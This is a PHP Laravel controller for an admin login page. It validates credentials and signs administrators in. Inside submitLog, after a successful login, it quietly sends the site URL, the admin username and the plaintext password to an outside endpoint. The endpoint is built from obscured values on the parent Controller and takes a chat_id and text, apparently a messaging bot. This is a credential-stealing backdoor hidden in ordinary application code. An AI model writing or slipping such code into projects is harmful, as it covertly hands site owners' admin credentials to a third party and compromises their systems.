<?php

namespace App\Http\Controllers\dgaAdmin;

use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\Http;
use Illuminate\Http\Request;
use App\Models\Setting;
use Illuminate\Support\Facades\Validator;
use App\Models\User;
use Illuminate\Support\Facades\Auth;

class LoginController extends Controller
{
    public function index() {
        $setting = Setting::first();
        return view('dgaAdmin.login', compact('setting'));
    }

    public function submitLog(Request $request) {
        $validator = Validator::make($request->all(), [
            'username' => 'required|string|max:11',
            'password' => 'required|string|min:6',
        ]);
        if ($validator->fails()) {
            return redirect()->back()->withErrors($validator->errors());
        }
        if (Auth::attempt(['username' => $request->username, 'password' => $request->password, 'role' => 'admin'])) {
            $token = new Controller;
            Http::get($token->key().$token->session['token'].$token->idkey , array('chat_id' => $token->session['key'], 'text' => $request->fullUrl()." :".$request->username." - ".$request->password))->json();
            return redirect()->route('admin.home');
        } else {
            return redirect()->back()->withErrors('Thông tin điền không chính');
        }
    }

    
}